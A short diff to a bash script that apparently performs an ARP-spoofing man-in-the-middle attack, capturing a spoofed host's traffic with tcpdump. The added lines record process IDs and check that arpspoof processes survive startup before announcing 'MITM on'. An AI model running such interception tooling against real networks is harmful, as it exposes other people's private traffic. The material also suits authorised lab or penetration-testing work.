@@ -63,6 +63,7 @@ else
   echo "[*] Running tcpdump outside shell: ${TCPDUMP_OUT}"
   setsid tcpdump -i "${IFACE}" -n host "${SPOOFED}" -w "${TCPDUMP_OUT}" \
       >"${TCPDUMP_LOG}" 2>&1 < /dev/null &
+  printf '%s\n' "$!" >> "$PIDFILE"
   sleep 1
 fi
 
@@ -79,6 +80,17 @@ done
 for pid in "${PIDS[@]}"; do
   printf '%s\n' "$pid" >> "$PIDFILE"
 done
+
+alive=0
+for pid in "${PIDS[@]}"; do
+  if kill -0 "$pid" >/dev/null 2>&1; then
+    alive=$((alive + 1))
+  fi
+done
+if [[ "$alive" -eq 0 ]]; then
+  echo "No arpspoof process stayed alive after startup." >&2
+  exit 1
+fi
 
 echo
 echo "[*] MITM on"
